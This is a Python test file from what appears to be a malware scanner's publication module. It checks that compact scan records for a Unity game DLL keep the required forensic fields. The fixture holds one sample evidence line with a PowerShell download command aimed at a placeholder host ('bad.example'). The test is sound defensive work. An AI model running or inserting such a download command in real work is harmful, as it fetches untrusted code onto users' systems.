from Virus_Scan.publication.json_writer import compact_result_record


REQUIRED_FORENSIC_FIELDS = frozenset({
    "schema_version",
    "input_file_path",
    "detected_engine",
    "container_engine",
    "artifact_engine",
    "scheduler_mode",
    "worker_id",
    "scan_duration_seconds",
    "temporal_signals",
    "markov_sequence_signals",
    "clustering_signals",
    "graph_signals",
    "yara_signals",
    "entropy_signals",
    "archive_container_signals",
    "decoded_evidence_snippets",
    "errors",
    "warnings",
    "crash_traceback",
    "evidence",
    "contextual_signal_frame",
})


def test_stage376_compact_rpgm_unity_renpy_records_keep_required_forensic_fields():
    compact = compact_result_record({
        "file": "Game_Data/Managed/Assembly-CSharp.dll",
        "score": 61.0,
        "classification": "high_confidence",
        "tags": ["unity_dotnet", "powershell_exec", "archive_member"],
        "detected_engine": "unity",
        "artifact_engine": "unity",
        "container_engine": "unity",
        "effective_analysis_engine": "pe",
        "declared_extension": ".dll",
        "sniffed_type": "pe",
        "scheduler_mode": "process",
        "worker_id": "worker-1",
        "scan_duration_seconds": 0.25,
        "decoded_evidence_snippets": ["PowerShell: powershell iwr http://bad.example"],
    })

    assert REQUIRED_FORENSIC_FIELDS.issubset(compact.keys())
    assert compact["schema_version"] == "scan_result_compact_v2"
    assert compact["input_file_path"] == "Game_Data/Managed/Assembly-CSharp.dll"
    assert compact["contextual_signal_frame"]["artifact_engine"] == "unity"
    assert compact["decoded_evidence_snippets"]
    assert compact["archive_container_signals"]
